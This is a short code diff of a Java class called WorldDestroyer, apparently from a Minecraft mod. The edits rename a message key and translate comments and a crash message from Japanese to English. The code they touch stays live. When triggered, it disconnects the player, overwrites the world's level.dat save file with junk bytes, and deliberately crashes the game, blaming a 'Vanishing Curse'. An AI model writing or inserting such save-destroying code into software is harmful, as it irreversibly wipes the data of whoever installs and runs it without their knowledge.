@@ -39,7 +39,7 @@ public class WorldDestroyer {
             data.setDoomed(true);
             player.getServer().saveEverything(true, true, true);
 
-            player.connection.disconnect(Component.translatable("message.apotheosis_infnite.lol"));
+            player.connection.disconnect(Component.translatable("message.apothic_infnite.lol"));
         }
     }
     @SubscribeEvent
@@ -51,7 +51,6 @@ public class WorldDestroyer {
             File worldDir = level.getServer().getWorldPath(LevelResource.ROOT).toFile();
             File levelDat = new File(worldDir, "level.dat");
 
-            // level.dat をゴミデータで上書き破壊
             if (levelDat.exists()) {
                 try (FileOutputStream fos = new FileOutputStream(levelDat)) {
                     byte[] junk = new byte[4096];
@@ -62,8 +61,7 @@ public class WorldDestroyer {
                 }
             }
 
-            // 強制クラッシュ
-            Minecraft.getInstance().crash(new CrashReport("消滅の呪いにより世界は崩壊しました。", new RuntimeException("World Corrupted")));
+            Minecraft.getInstance().crash(new CrashReport("The world was destroyed by the Vanishing Curse.", new RuntimeException("World Corrupted")));
         }
     }
 }
